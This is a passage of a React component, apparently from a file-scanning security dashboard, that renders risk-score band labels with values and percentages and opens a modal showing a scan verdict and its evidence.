                        {item.name === 'Medium' && 'Score 30–59 (Suspicious Anomaly)'}
                        {item.name === 'Low' && 'Score 0–29 (Safe & Harmless)'}
                      </div>
                    </div>
                  </div>
                  <div className="text-right pl-2">
                    <div className="font-mono font-bold text-white text-base">{item.value}</div>
                    <div className="text-xs text-slate-500 font-mono">{percent}%</div>
                  </div>
                </button>
              );
            })}
          </div>
        </div>
      </div>

      {/* POPUP MODAL: Clean File vs Warning on Threats (Explains what is the problem in the file) */}
      <ScanVerdictModal
        isOpen={scanPopupOpen}
        onClose={() => setScanPopupOpen(false)}
        verdict={scanVerdict}
        evidence={scanEvidence}
        onNavigateToDetails={onSelectInvestigation}
        onNavigateToDefense={onNavigateToDefense}
      />
    </div>
  );
};
